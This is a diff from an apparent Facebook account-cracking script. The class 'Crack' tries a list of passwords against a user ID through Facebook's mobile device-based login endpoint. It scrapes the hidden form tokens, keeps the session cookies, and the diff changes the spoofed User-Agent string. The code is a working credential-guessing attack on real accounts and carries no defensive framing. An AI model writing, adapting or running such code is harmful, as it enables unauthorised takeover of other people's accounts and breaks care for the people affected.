@@ -715,7 +715,7 @@ class Crack:
 			for pw in manual:
 				pw = pw.lower()
 				ses = requests.Session()
-				ua = ("Mozilla/5.0 (Linux; Android 4.4.2; HTC Desire 610 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36")
+				ua = ("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (via ggpht.com)")
 				p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://m.facebook.com/login.php","flow":"login_no_pin","pass":pw,}
 				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
